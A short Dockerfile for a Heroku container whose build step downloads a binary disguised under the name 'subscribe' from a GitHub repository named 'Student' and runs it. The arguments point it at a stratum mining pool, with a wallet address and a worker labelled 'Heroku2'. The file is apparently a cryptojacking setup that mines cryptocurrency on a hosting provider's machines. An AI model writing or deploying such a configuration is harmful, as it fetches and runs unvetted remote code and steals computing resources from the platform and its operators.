FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MgTy2Ue7HDyc8z73w5zv9Ydxme89zuakEG.Heroku2
CMD bash heroku.sh
